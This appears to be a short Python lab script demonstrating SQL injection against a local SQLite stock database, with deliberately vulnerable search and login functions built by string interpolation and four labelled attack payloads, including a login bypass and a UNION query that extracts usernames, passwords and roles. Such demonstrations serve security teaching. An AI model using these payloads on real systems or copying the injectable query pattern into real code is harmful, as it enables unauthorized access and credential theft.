import sqlite3

# Connect to your database file
conn = sqlite3.connect('nyondo_stock.db')

def search_product(name):
    query = f"SELECT * FROM products WHERE name LIKE '%{name}%'"
    print(f"Query: {query}")
    rows = conn.execute(query).fetchall()
    print(f"Result: {rows}\n")
    return rows

def login(username, password):
    query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
    print(f"Query: {query}")
    row = conn.execute(query).fetchone()
    print(f"Result: {row}\n")
    return row


print("=== Attack 1: Dump all products ===")
search_product("' OR 1=1--")

print("=== Attack 2: Login bypass ===")
login("admin'--", "anything")

print("=== Attack 3: Always true login ===")
login("' OR '1'='1", "' OR '1'='1")

print("=== Attack 4: UNION attack ===")
search_product("' UNION SELECT id, username, password, role FROM users--")

conn.close()

